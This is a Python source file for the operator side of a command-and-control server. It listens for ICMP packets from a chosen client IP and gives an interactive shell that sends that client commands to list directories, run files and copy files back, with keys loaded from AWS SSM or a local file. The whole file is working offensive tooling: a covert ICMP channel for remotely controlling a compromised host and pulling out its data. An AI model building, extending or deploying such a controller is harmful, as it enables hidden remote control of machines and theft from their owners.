#!/usr/bin/env python3

# *********************************************************
#
# Description: Main interactive administration interface terminal shell for C2.
# Usage: sudo .venv/bin/python3 server/cnc_handler.py -i <interface> -d <client_ip>
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import os
import stat
from pathlib import Path
import argparse
import asyncio
import sys
from typing import Final
import scapy.all as scapy

import cnc_session
from common import cnc_core, cnc_crypto
from cryptography.hazmat.primitives.asymmetric import ed25519 as _ed25519

SHUTDOWN_TIMEOUT_WINDOW: Final[float] = 1.0


# ==============================================================================

# --- Functions ---

def parse_cli_arguments() -> argparse.Namespace:
    """Parse and return validated CLI arguments for the server handler."""
    parser = argparse.ArgumentParser(
        description="Authenticated server control CLI."
    )
    parser.add_argument(
        "-i", "--interface", type=str, required=True, help="Network interface"
    )
    parser.add_argument(
        "-d", "--destination-ip", type=cnc_core.validate_ipv4,
        required=True, help="Client IPv4 address"
    )
    parser.add_argument(
        "-s", "--packet-size", type=int, default=cnc_core.DEFAULT_PACKET_SIZE,
        help="Total packet frame size limit (bytes)"
    )
    return parser.parse_args()

# ==============================================================================

async def independent_shell_loop(
        session: cnc_session.ServerSession
) -> None:
    """Read operator commands from stdin and enqueue them for delivery."""
    loop = asyncio.get_running_loop()
    print("[Server] Shell ready.  ls <path> | run <cmd> | copy <path> | exit")
    while not session.shutdown_event.is_set():
        sys.stdout.write(">> ")
        sys.stdout.flush()
        line = (await loop.run_in_executor(
            None, lambda: sys.stdin.readline()
        )).strip()
        if not line:
            continue

        parts = line.split(None, 1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd == "exit":
            print("[Server] Sending shutdown signal...")
            await loop.run_in_executor(None, session.send_shutdown_handshake)
            await asyncio.sleep(SHUTDOWN_TIMEOUT_WINDOW)
            session.shutdown_event.set()
            break
        elif cmd == "ls":
            await session.outbound_queue.put(
                (arg.encode("utf-8"), cnc_core.CMD_LIST_DIR)
            )
        elif cmd == "run":
            await session.outbound_queue.put(
                (arg.encode("utf-8"), cnc_core.CMD_RUN_FILE)
            )
        elif cmd in ("copy", "get"):
            await session.outbound_queue.put(
                (arg.encode("utf-8"), cnc_core.CMD_FILE_TRANSFER)
            )
        else:
            print(f"[!] Unknown command '{cmd}'. Use: ls | run | copy | exit")

# ==============================================================================

def load_server_identity_key(env_path: str = ".env.server") -> str:
    """Load SERVER_PRIVATE_HEX from AWS SSM or fall back to .env.server."""
    s_priv = ""

    try:
        import boto3
        from botocore.config import Config
        region = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
        ssm = boto3.client(
            "ssm", region_name=region,
            config=Config(connect_timeout=3, read_timeout=5, retries={"max_attempts": 1})
        )
        s_priv = ssm.get_parameter(
            Name="/cnc/server_private_hex", WithDecryption=True
        )["Parameter"]["Value"]
        print("[Server] Identity key loaded from AWS SSM Parameter Store.", file=sys.stderr)
    except Exception:
        pass

    if not s_priv:
        env_file = (
            Path(env_path) if Path(env_path).is_absolute()
            else Path(__file__).parent / env_path
        )
        if env_file.is_file():
            if env_file.stat().st_mode & (stat.S_IRWXG | stat.S_IRWXO):
                raise PermissionError(
                    f"Insecure permissions on {env_file}! "
                    f"Run: chmod 600 {env_file}"
                )
            for line in env_file.read_text(encoding="utf-8").splitlines():
                if line.strip() and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    os.environ.setdefault(k.strip(), v.strip().strip("'\""))
        s_priv = os.environ.get("SERVER_PRIVATE_HEX", "")

    if not s_priv:
        raise RuntimeError(
            f"Missing SERVER_PRIVATE_HEX: AWS SSM unavailable and "
            f"{env_file} not found or empty."
        )

    return s_priv.strip()

# ==============================================================================

async def main(args: argparse.Namespace) -> None:
    """Load the identity key, start the sniffer, and run the event loop."""
    identity_priv_hex = load_server_identity_key()
    identity_pub_bytes = (
        _ed25519.Ed25519PrivateKey.from_private_bytes(bytes.fromhex(identity_priv_hex))
        .public_key().public_bytes_raw()
    )
    cnc_crypto.init_handshake_psk(identity_pub_bytes)
    cnc_core.update_dynamic_packet_size(args.packet_size)
    loop = asyncio.get_running_loop()
    session = cnc_session.ServerSession(args, identity_priv_hex)
    sniff_process = scapy.AsyncSniffer(
        iface=args.interface,
        filter=f"icmp and src host {args.destination_ip}",
        prn=lambda pkt: session.process_incoming_frame(pkt, event_loop=loop),
        store=False
    )
    sniff_process.start()
    try:
        await asyncio.gather(
            independent_shell_loop(session),
            cnc_session.reactive_network_dispatcher(session)
        )
    finally:
        sniff_process.stop()
        session.close()

# ==============================================================================

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must run as root (raw socket requires root).", file=sys.stderr)
        sys.exit(1)
    parsed_args = parse_cli_arguments()
    try:
        asyncio.run(main(parsed_args))
    except KeyboardInterrupt:
        print("\n[!] Server terminal execution interrupted.")
        sys.exit(0)